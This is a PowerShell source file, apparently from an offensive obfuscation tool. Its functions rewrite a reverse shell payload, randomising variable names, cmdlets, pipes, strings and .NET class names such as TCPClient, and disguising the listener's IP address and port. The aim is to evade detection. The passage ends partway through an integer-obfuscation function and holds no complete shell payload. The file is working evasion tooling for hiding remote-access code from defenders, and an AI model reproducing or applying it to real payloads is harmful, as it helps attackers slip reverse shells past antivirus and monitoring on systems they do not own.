Function New-EncodedBeacon() {
    <#
    .SYNOPSIS
        Genenerates an encoded beacon value from a given value.
    
    .DESCRIPTION
        Genenerates an encoded beacon to enable us to obfuscate each instance of a non-unqiue value.

    .PARAMETER Value
        The Value parameter is used to instruct the function which value needs to be converted into a beacon.
        If no value is provided, then the function will insert a timestamp.
    
    .EXAMPLE
        PS C:\> New-EncodedBeacon -Value 'value'
    
    .NOTES
        Additional information about the function.
    #>
    [OutputType([System.String])]
    param
    (
        [Parameter(Mandatory = $false, Position = 0)]
        [System.String]$Value
    )
    Begin {
        $Start = "<obfus"
        $End = 'cate>'
    }
    Process {
        if ($Value) {
            $Beacon = $Start + (($Value -split '') -join '%') + $End
        }
        else {
            $Beacon = $Start + ((Get-Date -UFormat %s).Split('.')[0]) + $End
        }
    }
    End {
        return $Beacon
    }
}

function ConvertTo-OneLine {
    <#
    .SYNOPSIS
        Converts a given payload to a single line.
    
    .DESCRIPTION
        Payloads are loaded as a string array and joined together with a semicolon to allow for single line conversions.
    
    .PARAMETER Payload
        The payload containing the PowerShell script to be converted.
    
    .EXAMPLE
        PS C:\> ConvertTo-OneLine -Payload $value1
    
    .NOTES
        Additional information about the function.
    #>
    [OutputType([System.String])]
    param
    (
        [Parameter(Mandatory = $true, Position = 0)]
        [System.Array]$Payload
    )
    Process {
        $Payload = $Payload -join ';'
    }
    End {
        return $Payload
    }
}

Function Resolve-Aliases() {
    <#
    .SYNOPSIS
        Resolves aliases to their proper name.
    
    .DESCRIPTION
        Resolves aliases within the payload to their proper name. The supported aliases are hardcoded into the function.
    
    .PARAMETER Payload
        The payload containing the PowerShell script to be converted.
    
    .EXAMPLE
        PS C:\> Resolve-Aliases -Payload 'value1'
    
    .NOTES
        Additional information about the function.
    #>
    [OutputType([System.String])]
    param
    (
        [Parameter(Mandatory = $true, Position = 0)]
        [System.String]$Payload
    )
    Begin {
        $Aliases = ('%', 'ForEach-Object'), ('iex', 'Invoke-Expression'), ('pwd', 'Get-Location')
    }
    Process {
        ForEach ($A in $Aliases) {       
            [regex]$Pattern = "(?<!\$)$($A[0])"
            $Payload = $Payload -replace $Pattern, "$($A[1])"
        }
    }
    End {
        return $Payload
    }
}

Function Format-SocketBeacons() {
    <#
    .SYNOPSIS
        Identifies and replaces the socket listener details with beacon values.
    
    .DESCRIPTION
        Identifies and replaces the socket listener details with beacon values in order to prevent conflicts with the integer-related functions.
    
    .PARAMETER Payload
        The payload containing the PowerShell script to be converted.
    
    .PARAMETER IPAddress
        The IPAddress switch is used to instruct the function to insert a beacon in the socket ip address.

    .PARAMETER Port
        The Port switch is used to instruct the function to insert a beacon in the socket port number.
    
    .EXAMPLE
        PS C:\> Format-SocketBeacons -Payload 'value1' -IPAddress 'value1'

    .EXAMPLE
        PS C:\> Format-SocketBeacons -Payload 'value1' -IPAddress 'value1' -Port 'value1'
    
    .NOTES
        Additional information about the function.
    #>
    [OutputType([System.String])]
    param
    (
        [Parameter(Mandatory = $true, Position = 0)]
        [System.String]$Payload,
        [switch]$IPAddress,
        [switch]$Port
    )
    Begin {
        $Occurrence = ($Payload | Select-String '("|'')\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}("|''),\d+' -AllMatches).Matches.Value
    }
    Process {  
        Try {
            if ($IPAddress) {
                # Replace the socket ip address with a beacon value
                $BeaconType = 'ip address'
                $Payload = $Payload.replace(($Occurrence -split ',')[0], '<BEACON_IP>')
            }

            if ($Port) {
                # Replace the socket port number with a beacon value
                $BeaconType = 'port number'
                $Payload = $Payload.replace(($Occurrence -split ',')[1], '<BEACON_Port>')
            }
        }
        Catch [System.Management.Automation.MethodInvocationException ] {
            # We need the ip and port to be in the following format or else it will be empty: "10.10.10.10",80
            if ($($_.Exception.Message) -like '*String cannot be of zero length*') {
                Write-Host "[!] Could not locate a socket $BeaconType - Skipping"
            }
        }
        Catch {
            Write-Host "[!] Error in $($MyInvocation.MyCommand.Name) - $($_.Exception.Message) - Type $($_.Exception.GetType().FullName) - Skipping"
        }
    }
    End {
        return $Payload
    }
}

function Get-OperatorEncapsulation() {
    <#
    .SYNOPSIS
        Encapsulates a given value within up to 3 different operating groupings.
    
    .DESCRIPTION
        Encapsulates a given value within up to 3 different operating groupings by selecting
        a random number between 0 and 3. If the value is 0 nothing will change and the value is passed
        in it's original form. Otherwise it will encapsulted between grouping expression operator () 
        or the subexpression operator $()

    .PARAMETER Value
        The value to be potentionally encapsulated within powershell operators.
    
    .EXAMPLE
        PS C:\> Get-OperatorEncapsulation -Value 'value'
    
    .NOTES
        Additional information about the function.
    #>
    [OutputType([System.String])]
    param (
        [Parameter(Mandatory = $true, Position = 0)]
        [System.String]$Value
    )
    Begin {
        $maxIterations = 1..3 | Get-Random
        $NewValue = $Value
    }
    Process {
        $iterations = 1
        while ($iterations -le $maxIterations) {
            # Subexpression operator
            if ((1..2 | Get-Random) -eq 1) {
                $newValue = '$(' + $newValue + ')'
            }
            # Grouping Expression operator
            else {
                $newValue = '(' + $newValue + ')'
            }
            $iterations++
        }
    }
    End {
        return $NewValue
    }
}

Function Get-ObfuscatedVariable() {
    <#
    .SYNOPSIS
        Genenerates a random variable name.
    
    .DESCRIPTION
        Generates a random variable name using a randomly selected algorithm.
    
    .EXAMPLE
        PS C:\> Get-ObfuscatedVariable
    
    .NOTES
        If you are reading this then you have noticed that generators 1-3 result in the same thing.
        The idea here is to inspire you by showing you there is always more than one way to
        generate an intended value or logic.
    #>
    [OutputType([System.String])]
    param ()
    Begin {
        $Picker = 1..3 | Get-Random
        If ($ShowChanges) {
            Write-Host -NoNewline "    Generator $($Picker) >> "
        }
    }
    Process {
        Switch ($Picker) {
            1 {
                # Generates a random variable name by selecting at random, up to 25 numbers from the ASCII set (0-9, A-Z, a-z) and concatenating them together with their associated letter and the $ symbol to form a proper variable name.
                $NewValue = '$' + (((48..57) + (65..90) + (97..122) | Get-Random -Count (1..25 | Get-Random) | ForEach-Object { [char]$_ }) -join '')
            }
            2 {
                # Generates a random variable name by selecting at random, up to 25 numbers from the given alpha-numerical set and concatenating them together the $ symbol to form a proper variable name.
                $NewValue = '$' + (('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.ToCharArray() | Get-Random -Count (1..25 | Get-Random) | ForEach-Object { $_ }) -join '')
            }
            3 {
                # Generates a randomized array of an alpha-numerical set, then selects up to 25 randomly selected characters based on their position in the array
                $AlphaNum = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.ToCharArray() | Sort-Object { Get-Random }
                $NewValue = '$' + ((0..(Get-Random -Minimum 1 -Maximum 25) | ForEach-Object { $AlphaNum[$(Get-Random -Minimum 0 -Maximum $AlphaNum.Count)] } ) -join '')
            }
        }
    }
    End {
        return $NewValue
    }
}

function Find-Variable() {
    <#
    .SYNOPSIS
        Identifies and replaces variables within a given payload.
    
    .DESCRIPTION
        Peforms a regex search for all variables within the payload and replaces each instance with a new value.
    
    .PARAMETER Payload
        The payload containing the PowerShell script to be converted.
    
    .EXAMPLE
        PS C:\> Find-Variable -Payload 'value1'
    
    .NOTES
        This function replaces each instance with a unique value across the board to ensure integrity with variable usage within the payload.
    #>
    [OutputType([System.String])]
    param
    (
        [Parameter(Mandatory = $true, Position = 0)]
        [System.String]$Payload
    )
    Begin {
        $Pattern = '(?<!\w)\$\w+'
        $Occurrences = [regex]::Matches($Payload, $Pattern).Value | Where-Object { $_ -notlike '$_*' -and $_ -ne '$true' -and $_ -ne '$false' } | Select-Object -Unique
    }
    Process { 
        Try { 
            # For each occurence, replace it with an obfuscated value
            ForEach ($O in $Occurrences) {
                $NewValue = Get-ObfuscatedVariable
                $Payload = $Payload -replace [Regex]::Escape($O), $NewValue

                # Show Changes
                if ($ShowChanges) {
                    Write-Host "$O >> $NewValue"
                }
            }
        }
        Catch {
            Write-Host "[!] $($MyInvocation.MyCommand.Name) Error - $($_.Exception.Message) - Skipping"
        }
    }
    End {
        return $Payload
    }
}

function Get-ObfuscatedCmdlet() {
    <#
    .SYNOPSIS
        Genenerates a new variation of the derived cmdlet.
    
    .DESCRIPTION
        Genenerates a new variation of the derived cmdlet variation using a randomly selected algorithm.
    
    .PARAMETER Cmdlet
        The cmdlet that will be replaced within the given payload.

    .EXAMPLE
        PS C:\> Get-ObfuscatedCmdlet -Cmdlet 'value'
    
    .NOTES
        Additional information about the function.
    #>
    [OutputType([System.String])]
    param
    (
        [Parameter(Mandatory = $true, Position = 0)]
        [System.String]$Cmdlet
    )
    Begin {
        $Picker = 1..2 | Get-Random
        If ($ShowChanges) {
            Write-Host -NoNewline "    Generator $($Picker) >> "
        }
    }
    Process {
        Switch ($Picker) {
            1 { 
                # All valid characters in a cmdlet name
                $Valid = ('-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.ToCharArray() | Sort-Object { Get-Random }) -join ''
                $ReplaceWith = $Valid.ToCharArray()
                $ExtractedCharArray = @()
                $CmdletCharArray = $Cmdlet.ToCharArray()
                
                # Loop through each character within each command
                ForEach ($Char in $CmdletCharArray) {
                    If ($Char -in $ReplaceWith) {
                        $ExtractedCharArray += $([array]::IndexOf($ReplaceWith, $Char))
                    }
                }

                # Final Value
                $NewValue = "& ((""$Valid"")[$($ExtractedCharArray -join ',')] -join '')"
            }
            2 {
                $CharArrayString = ($Cmdlet.ToCharArray() | ForEach-Object { [int][char]$_ }) -join ","
                $NewValue = '& ([string]::join('''', ( (<OBFUSCATED>) |%{ ( [char][int] $_)})) | % {$_})' -replace '<OBFUSCATED>', $CharArrayString
            }
        }
    }
    End {
        return $NewValue
    }
}

function Find-Cmdlet() {
    <#
    .SYNOPSIS
        Identifies and replaces cmdlets within a given payload.
    
    .DESCRIPTION
        Peforms a regex search for all cmdlets within the payload and replaces each cmdlet instance with a new value.
    
    .PARAMETER Payload
        The payload containing the powershell script to be converted
    
    .EXAMPLE
        PS C:\> Find-Cmdlet -Payload 'Value1'
    
    .NOTES
        This replaces each instance with a unique value by inserting unique beacon values that get replaced.
    #>
    [OutputType([System.String])]
    param
    (
        [Parameter(Mandatory = $true, Position = 0)]
        [System.String]$Payload
    )
    Begin {
        $Occurrences = Get-Command | Where-Object { $_.name -like "*-*" } | Select-Object -ExpandProperty Name | ForEach-Object { 
            if ($Payload -like "*$_*") { 
                $_ 
            } 
        }
    }
    Process {  
        try {
            # For each occurence, replace it with a beacon value
            $Occurrences | ForEach-Object {
                $Beacon = New-EncodedBeacon -Value $_
                [regex]$Pattern = "(?<!<obfu%)$_(?!%cate>)"
                $Payload = $Pattern.replace($Payload, $Beacon)
            }

            # For each occurence, replace it with an obfuscated value
            (($Payload | Select-String '<obfus(.*?)cate>' -AllMatches)).Matches.Value | ForEach-Object {
                $Decoded = $_ -replace '<obfus' -replace 'cate>' -replace '%'
                $NewValue = Get-ObfuscatedCmdlet -cmdlet $Decoded
                $Payload = $Payload.Replace("$_", $NewValue, 1)

                # Show Changes
                if ($ShowChanges) {
                    Write-Host "$Decoded >> $NewValue"
                }
            }
        }
        Catch {
            Write-Host "[!] $($MyInvocation.MyCommand.Name) Error - $($_.Exception.Message) - Skipping"
        }
    }
    End {
        return $Payload
    }
}

function Get-ObfuscatedPipe() {
    <#
    .SYNOPSIS
        Genenerates a new pipe variation.
    
    .DESCRIPTION
        Generates a random pipe variation name using a randomly selected algorithm.
    
    .EXAMPLE
        PS C:\> Get-ObfuscatedPipe
    
    .NOTES
        Additional information about the function.
    #>
    [OutputType([System.String])]
    param ()
    Begin {
        $Picker = 1..11 | Get-Random
        If ($ShowChanges) {
            Write-Host -NoNewline "    Generator $($Picker) >> "
        }
    }
    Process {
        Switch ($Picker) {
            1 { $NewValue = '|%{$_}|' }
            2 { $NewValue = '|%{;$_}|' }
            3 { $NewValue = '|%{;$_;}|' }
            4 { $NewValue = '|<##>%{$_}<##>|' }
            5 { $NewValue = '|<##>%{$_}|' }
            6 { $NewValue = '|<##>ForEach-Object{$_}<##>|' }
            7 { $NewValue = '|<##>ForEach-Object{$_}|' }
            8 { $NewValue = '|%{$_}|ForEach-Object{$_}|' }
            9 { $NewValue = '|ForEach-Object{$_}|%{$_}|' }
            10 { $NewValue = '|ForEach-Object{$_}|' }
            11 { $NewValue = '|ForEach-Object{$_}|ForEach-Object{$_}|' }
        }
    }
    End {
        return $NewValue
    }
}

function Find-Pipe() {
    <#
    .SYNOPSIS
        Identifies and replaces pipes within a given payload.
    
    .DESCRIPTION
        Peforms a regex search for all pipes (|) within the payload and replaces each instance with a new value.
    
    .PARAMETER Payload
        The payload containing the PowerShell script to be converted.
    
    .EXAMPLE
        PS C:\> Find-Pipe -Payload 'value1'
    
    .NOTES
        This replaces each instance with a unique value by inserting unique beacon values that get replaced.
    #>
    [OutputType([System.String])]
    param
    (
        [Parameter(Mandatory = $true, Position = 0)]
        [System.String]$Payload
    )
    Begin {
        $Occurrences = ($Payload | Select-String "\|" -AllMatches).Matches.Value
    }
    Process {  
        try {
            # For each occurence, replace it with a beacon value
            $Occurrences | ForEach-Object {
                $Beacon = New-EncodedBeacon -Value $_
                [regex]$Pattern = "(?<!<obfu%)\|(?!%cate>)"
                $Payload = $Pattern.replace($Payload, $Beacon, 1)
            }

            # For each occurence, replace it with an obfuscated value
            (($Payload | Select-String '<obfus(.*?)cate>' -AllMatches)).Matches.Value | ForEach-Object {
                $Decoded = $_ -replace '<obfus' -replace 'cate>' -replace '%'
                $NewValue = Get-ObfuscatedPipe
                $Payload = $Payload.Replace("$_", $NewValue, 1)

                # Show Changes
                if ($ShowChanges) {
                    Write-Host "$Decoded >> $NewValue"
                }
            }
        }
        Catch {
            Write-Host "[!] $($MyInvocation.MyCommand.Name) Error - $($_.Exception.Message) - Skipping"
        }
    }
    End {
        return $Payload
    }
}

function Get-ObfuscatedNamespace() {
    <#
    .SYNOPSIS
        Genenerates a new namespace class name variation.
    
    .DESCRIPTION
        Genenerates a new namespace class name variation using a randomly selected algorithm.

    .PARAMETER NamespaceClass
        The namespace class that will be replaced within the given payload.
    
    .EXAMPLE
        PS C:\> Get-ObfuscatedNamespace -NamespaceClass 'value'
    
    .NOTES
        Additional information about the function.
    #>
    [OutputType([System.String])]
    param
    (
        [Parameter(Mandatory = $true, Position = 0)]
        [System.String]$NamespaceClass
    )
    Begin {
        $Picker = 1..2 | Get-Random
        If ($ShowChanges) {
            Write-Host -NoNewline "    Generator $($Picker) >> "
        }
    }
    Process {
        Switch ($Picker) {
            1 {
                $CharArrayString = ($NamespaceClass.ToCharArray() | ForEach-Object { [int][char]$_ }) -join ","
                $NewValue = '([string]::join('''', ( (<OBFUSCATED>) |%{ ( [char][int] $_)})) | % {$_})' -replace '<OBFUSCATED>', $CharArrayString
            }
            2 {
                $Chars = ([int[]][char[]]$NamespaceClass | ForEach-Object { 
                        $OrigChar = $_
                        $Random = 1..122 | Get-Random
                        $Iteration = (1..3 | get-random)
                        if ($Iteration -eq 1) {
                            "[char]($Random+$OrigChar-$Random)"
                        }
                        elseif (($Iteration -eq 2)) {
                            "[char]($Random*$OrigChar/$Random)"
                        }
                        elseif (($Iteration -eq 3)) {
                            "[char](0+$OrigChar-0)"
                        }
                    }) -join '+'

                $NewValue = '$(<OBFUSCATED>)' -replace '<OBFUSCATED>', $Chars
            }
        }
    }
    End {
        return $NewValue
    }
}
function Find-Namespace() {
    <#
    .SYNOPSIS
        Identifies and replaces namespace class names within a given payload.
    
    .DESCRIPTION
        Peforms a regex search for the defined set of namespace class names within the payload and replaces each instance with a new value.
    
    .PARAMETER Payload
        The payload containing the PowerShell script to be converted.
    
    .EXAMPLE
        PS C:\> Find-Namespace -Payload 'value1'
    
    .NOTES
        This replaces each instance with a unique value by inserting unique beacon values that get replaced.
    #>
    [OutputType([System.String])]
    param
    (
        [Parameter(Mandatory = $true, Position = 0)]
        [System.String]$Payload
    )
    Begin {
        $Pattern = '(?<!\[)System\.IO\.MemoryStream|System\.IO\.Compression\.GZipStream|System\.Net\.Sockets\.TCPClient|System\.Text\.ASCIIEncoding|System\.Text\.UnicodeEncoding|System\.IO\.Compression\.CompressionMode(?!\])'
        $Occurrences = [regex]::Matches($Payload, $Pattern).Value | Select-Object -Unique
    }
    Process {  
        Try {
            # For each occurence, replace it with a beacon value
            $Occurrences | ForEach-Object {
                $Beacon = New-EncodedBeacon -Value $_
                [regex]$Pattern = "(?<!<obfu%)(?i)$_(?!%cate>)"
                $Payload = $Pattern.replace($Payload, $Beacon, 1)
            }
            
            # For each occurence, replace it with an obfuscated value
            (($Payload | Select-String '<obfus(.*?)cate>' -AllMatches)).Matches.Value | ForEach-Object {
                $Decoded = $_ -replace '<obfus' -replace 'cate>' -replace '%'
                $NewValue = Get-ObfuscatedNameSpace -NamespaceClass $Decoded
                $Payload = $Payload.Replace("$_", $NewValue, 1)

                # Show Changes
                if ($ShowChanges) {
                    Write-Host "$Decoded >> $NewValue"
                }
            }
        }
        Catch {
            Write-Host "[!] $($MyInvocation.MyCommand.Name) Error - $($_.Exception.Message) - Skipping"
        }
    }
    End {
        return $Payload
    }
}

Function Get-ObfuscatedIpAddress() {
    <#
    .SYNOPSIS
        Genenerates a new IP address variation
    
    .DESCRIPTION
        Genenerates a new IP address variation using a randomly selected algorithm.

    .PARAMETER IPAddress
        The IP address that will be replaced within the given payload.
    
    .EXAMPLE
        PS C:\> Get-ObfuscatedIpAddress -IPAddress 'value1'
    
    .NOTES
        Additional information about the function.
    #>
    [OutputType([System.String])]
    param
    (
        [Parameter(Mandatory = $true, Position = 0)]
        [System.String]$IPAddress
    )
    Begin {
        $Picker = 1..2 | Get-Random
        If ($ShowChanges) {
            Write-Host -NoNewline "    Generator $($Picker) >> "
        }
    }
    Process {
        Switch ($Picker) {
            1 {
                $randomSet = 1..4 | ForEach-Object { (((48..57) + (65..90) + (97..122) | Get-Random -Count (5..25 | Get-Random) | ForEach-Object { [char]$_ }) -join '') }
                $validSet = $ipAddress.split('.')
                $stage1 = '"' + ($randomSet -join '.') + '"'
                0..3 | ForEach-Object {
                    $ro = $($randomSet[$_])
                    $vo = $($validSet[$_])
                    $stage2 += ".replace('$ro',$vo)"
                }
                $newValue = "$stage1.replace$(($Stage2 -split '.replace' | Where-Object {$_} | sort-object {get-random}) -join '.replace')"
            }
            2 {
                $Delimiter = ('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.ToCharArray() | Get-Random -Count (1..10 | Get-Random)) -join ''
                $Value = ($Delimiter + ($IPAddress.Split('.') -join $Delimiter) + $Delimiter)
                $Reversed = @()
                ($Value.length - 1)..0 | ForEach-Object {
                    $Reversed += $Value[$_]
                }
                $Reversed = $Reversed -join ''
                $NewValue = '$($($Value = ''<OBFUSCATED>'' -split '''');$(((($Value.length-1)..0 | % { $Value[$_]}) -join '''') -replace ''<DELIMITER>'',''.'' -replace ''\.$|^\.''))' -replace '<OBFUSCATED>', $Reversed -replace '<DELIMITER>', $Delimiter
            }
        }
    }
    End {
        return $NewValue
    }
}

function Find-Listener() {
    <#
    .SYNOPSIS
        Identifies and replaces the IP and Port values for the reverse shell listener.
    
    .DESCRIPTION
        Peforms a regex search for the IP and Port declaration ("IP", Port) within the payload and replaces each instance with a new value.
    
    .PARAMETER Payload
        The payload containing the PowerShell script to be converted.
    
    .PARAMETER Port
        The user provided port for the reverse shell listener.
    
    .PARAMETER IPAddress
        The user provided IP address for the reverse shell listener.

    .PARAMETER Plain
        This switch is used to instruct the function to not obfuscate the listener ip and port values.
    
    .EXAMPLE
        PS C:\> Find-Listener -Payload 'value1' -Port 'value2' -IPAddress 'value3'
    
    .NOTES
        This assumes the IP address and port within the payload is structured as ("10.10.10.10",80)
    #>
    [OutputType([System.String])]
    param
    (
        [Parameter(Mandatory = $true, Position = 0)]
        [System.String]$Payload,
        [Parameter(Mandatory = $true, Position = 1)]
        [System.String]$Port,
        [Parameter(Mandatory = $true, Position = 2)]
        [System.String]$IPAddress,
        [switch]$Plain
    )
    Begin {
        $BeaconIP = '<BEACON_IP>'
        $BeaconPort = '<BEACON_Port>'
    }
    Process {  
        Try {
            if (!$Plain) {
                # Replace the ip address of the listener
                $NewIPAddress = Get-ObfuscatedIpAddress -IPAddress $IPAddress

                # Show Changes
                if ($ShowChanges) {
                    Write-Host "$IPAddress >> $NewIPAddress"
                }  
        
                # Replace the port of the listener
                $NewPort = Get-ObfuscatedInteger -Integer $Port

                # Show Changes
                if ($ShowChanges) {
                    Write-Host "$Port >> $NewPort"
                }  

                # Replace the place holder ip and port with obfuscated user-provided values
                $Payload = $Payload.replace($BeaconIP, $NewIPAddress).replace($BeaconPort, $NewPort)        
            }
            else {
                # Replace the place holder ip and port with the user-provided values
                $Payload = $Payload.replace($BeaconIP, '"' + $IPAddress + '"').replace($BeaconPort, $Port)
            }
        }
        Catch [System.Management.Automation.MethodInvocationException ] {
            # We need the ip and port to be in the following format or else it will be empty: "10.10.10.10",80
            if ($($_.Exception.Message) -like '*String cannot be of zero length*') {
                Write-Host '[!] Could not locate a socket tcpclient ip and port declaration - Skipping'
            }
        }
        Catch {
            Write-Host "[!] Error in $($MyInvocation.MyCommand.Name) - $($_.Exception.Message) - Type $($_.Exception.GetType().FullName) - Skipping"
        }
    }
    End {
        return $Payload
    }
}

Function Get-ObfuscatedString {
    <#
    .SYNOPSIS
        Genenerates a new variation of the sendback prompts
    
    .DESCRIPTION
        Genenerates a new variation of the sendback strings using a randomly selected algorithm.

    .PARAMETER String
        The string that will be replaced within the given payload.
    
    .EXAMPLE
        PS C:\> Get-ObfuscatedString -String 'value1'
    
    .NOTES
        Additional information about the function.
    #>
    [OutputType([System.String])]
    param
    (
        [Parameter(Mandatory = $true, Position = 0)]
        [System.String]$String
    )
    Begin {
        $Picker = 1..3 | Get-Random
        If ($ShowChanges) {
            Write-Host -NoNewline "    Generator $($Picker) >> "
        }
        $String = $String -replace '"'
    }
    Process {
        Switch ($Picker) {
            1 {
                $CharArrayString = ($String.ToCharArray() | ForEach-Object { [int][char]$_ }) -join ","
                $NewValue = '([string]::join('''', ( (<OBFUSCATED>) |%{ ( [char][int] $_)})) | % {$_})' -replace '<OBFUSCATED>', $CharArrayString
            }
            2 {
                $Chars = ([int[]][char[]]$String | ForEach-Object { 
                        $OrigChar = $_
                        $Random = 1..122 | Get-Random
                        $Iteration = (1..3 | get-random)
                        if ($Iteration -eq 1) {
                            "[char]($Random+$OrigChar-$Random)"
                        }
                        elseif (($Iteration -eq 2)) {
                            "[char]($Random*$OrigChar/$Random)"
                        }
                        elseif (($Iteration -eq 3)) {
                            "[char](0+$OrigChar-0)"
                        }
                    }) -join '+'

                $NewValue = '$(<OBFUSCATED>)' -replace '<OBFUSCATED>', $Chars
            }
            3 {
                $NewValue = ((($String -replace '''') -split '') -join "'+'")
                $NewValue = $NewValue.Substring(2, $NewValue.Length - 4)
                $NewValue = Get-OperatorEncapsulation -Value $NewValue
            }
        }
    }
    End {
        return $NewValue
    }
}

function Find-String() {
    <#
    .SYNOPSIS
        Identifies and replaces the sendback prompt string values.
    
    .DESCRIPTION
        Peforms a regex search for the defined set expected sendback prompt values within the payload and replaces each instance with a new value.
    
    .PARAMETER Payload
        The payload containing the PowerShell script to be converted
    
    .EXAMPLE
        PS C:\> Find-String -Payload 'Value1'
    
    .NOTES
        This replaces each instance with a unique value by inserting unique beacon values that get replaced.
    #>
    Param (
        [Parameter(Mandatory = $true, Position = 0)]
        [System.String]$Payload
    )
    Begin {
        $Occurrences = (($Payload | Select-String '(["''])(?:(?=(\\?))\2.)*?\1' -AllMatches)).Matches.Value
    }
    Process {  
        Try {
            # For each occurence, replace it with a beacon value
            $Occurrences | ForEach-Object {
                $Beacon = New-EncodedBeacon -Value ($_ -replace '"')
                [regex]$Pattern = "(?<!<obfu%)([""''])(?:(?=(\\?))\2.)*?\1(?!%cate>)"
                $Payload = $Pattern.replace($Payload, $Beacon, 1)
            }

            # For each occurence, replace it with an obfuscated value
            (($Payload | Select-String '<obfus(.*?)cate>' -AllMatches)).Matches.Value | ForEach-Object {
                $Decoded = $_ -replace '<obfus' -replace 'cate>' -replace '%'
                $NewValue = Get-ObfuscatedString -String $Decoded
                $Payload = $Payload.Replace("$_", $NewValue, 1)

                # Show Changes
                if ($ShowChanges) {
                    Write-Host "$Decoded >> $NewValue"
                }
            }
        }
        Catch {
            Write-Host "[!] $($MyInvocation.MyCommand.Name) Error - $($_.Exception.Message) - Skipping"
        }
    }
    End {
        return $Payload
    }
}

function Get-ObfuscatedPipelineVariable() {
    <#
    .SYNOPSIS
        Genenerates a new pipeline object variable variation.
    
    .DESCRIPTION
        Generates a random pipe variation using a randomly selected algorithm.
    
    .EXAMPLE
        PS C:\> Get-ObfuscatedPipelineVariable
    
    .NOTES
        Additional information about the function.
    #>
    [OutputType([System.String])]
    param ()
    Begin {
        $Picker = 1..12 | Get-Random
        If ($ShowChanges) {
            Write-Host -NoNewline "    Generator $($Picker) >> "
        }
    }
    Process {
        Switch ($Picker) {
            1 { $NewValue = '<##>$_' }
            2 { $NewValue = '$_<##>' }
            3 { $NewValue = '<##>$_<##>' }
            4 { $NewValue = '<##>$($_)' }
            5 { $NewValue = '$($_)<##>' }
            6 { $NewValue = '<##>$($_)<##>' }
            7 { 
                $Random1 = ('<#' + (('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.ToCharArray() | Get-Random -Count (1..25 | Get-Random) | ForEach-Object { $_ }) -join '') + '#>')
                $NewValue = '<#1#>$_' -replace '<#1#>', $Random1
            }
            8 { 
                $Random1 = ('<#' + (('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.ToCharArray() | Get-Random -Count (1..25 | Get-Random) | ForEach-Object { $_ }) -join '') + '#>')
                $NewValue = '$_<#1#>' -replace '<#1#>', $Random1
            }
            9 { 
                $Random1 = ('<#' + (('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.ToCharArray() | Get-Random -Count (1..25 | Get-Random) | ForEach-Object { $_ }) -join '') + '#>')
                $Random2 = ('<#' + (('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.ToCharArray() | Get-Random -Count (1..25 | Get-Random) | ForEach-Object { $_ }) -join '') + '#>')
                $NewValue = '<#1#>$_<#2#>' -replace '<#1#>', $Random1 -replace '<#2#>', $Random2
            }
            10 {
                $Random1 = ('<#' + (('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.ToCharArray() | Get-Random -Count (1..25 | Get-Random) | ForEach-Object { $_ }) -join '') + '#>') 
                $NewValue = '<#1#>$($_)' -replace '<#1#>', $Random1
            }
            11 {
                $Random1 = ('<#' + (('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.ToCharArray() | Get-Random -Count (1..25 | Get-Random) | ForEach-Object { $_ }) -join '') + '#>') 
                $NewValue = '$($_)<#1#>' -replace '<#1#>', $Random1
            }          
            12 { 
                $Random1 = ('<#' + (('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.ToCharArray() | Get-Random -Count (1..25 | Get-Random) | ForEach-Object { $_ }) -join '') + '#>')
                $Random2 = ('<#' + (('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.ToCharArray() | Get-Random -Count (1..25 | Get-Random) | ForEach-Object { $_ }) -join '') + '#>')
                $NewValue = '<#1#>$($_)<#2#>' -replace '<#1#>', $Random1 -replace '<#2#>', $Random2
            }
        }
    }
    End {
        return $NewValue
    }
}

function Find-PipelineVariable() {
    <#
    .SYNOPSIS
        Identifies and replaces pipeline object variables.
    
    .DESCRIPTION
        Peforms a regex search for all pipeline object variables ($_) within the payload and replaces each instance with a new value.
        This does not replace instances where members of objects are being called ($_.)
    
    .PARAMETER Payload
        The payload containing the PowerShell script to be converted
    
    .EXAMPLE
        PS C:\> Find-PipelineVariable -Payload 'Value1'
    
    .NOTES
        This replaces each instance with a unique value by inserting unique beacon values that get replaced. 
    #>
    [OutputType([System.String])]
    param
    (
        [Parameter(Mandatory = $true, Position = 0)]
        [System.String]$Payload
    )
    Begin {
        $Occurrences = ($Payload | Select-String '\$_(?!\.)' -AllMatches).Matches.Count
    }
    Process {  
        Try {
            # For each occurence, replace it with a beacon value
            1..$Occurrences | ForEach-Object {
                [regex]$Pattern = '\$_(?!\.)'
                $Payload = $Pattern.replace($Payload, "<obfus($_)cate>", 1)
            }
    
            # For each occurence, replace it with an obfuscated value
            1..$Occurrences | ForEach-Object {
                $NewValue = Get-ObfuscatedPipelineVariable
                $Payload = $Payload.Replace("<obfus($_)cate>", $NewValue)
                
                # Show Changes
                if ($ShowChanges) {
                    Write-Host '$_ >> ' $NewValue
                }
            }
        }
        Catch {
            Write-Host "[!] $($MyInvocation.MyCommand.Name) Error - $($_.Exception.Message) - Skipping"
        }
    }
    End {
        return $Payload
    }
}

function Find-Integer() {
    <#
    .SYNOPSIS
        Identifies and replaces integers within the payload.
    
    .DESCRIPTION
        Peforms a regex search for all integers ($_) within the payload and replaces each instance with a new value.
        This does not replace instances of 2>&1, where integers exist in variable names or ip addresses.
    
    .PARAMETER Payload
        The payload containing the PowerShell script to be converted
    
    .EXAMPLE
        PS C:\> Find-Integer -Payload 'Value1'
    
    .NOTES
        This replaces each instance with a unique value by inserting unique beacon values that get replaced. 
    #>
    [OutputType([System.String])]
    param
    (
        [Parameter(Mandatory = $true, Position = 0)]
        [System.String]$Payload
    )
    Begin {
        $Count = 1
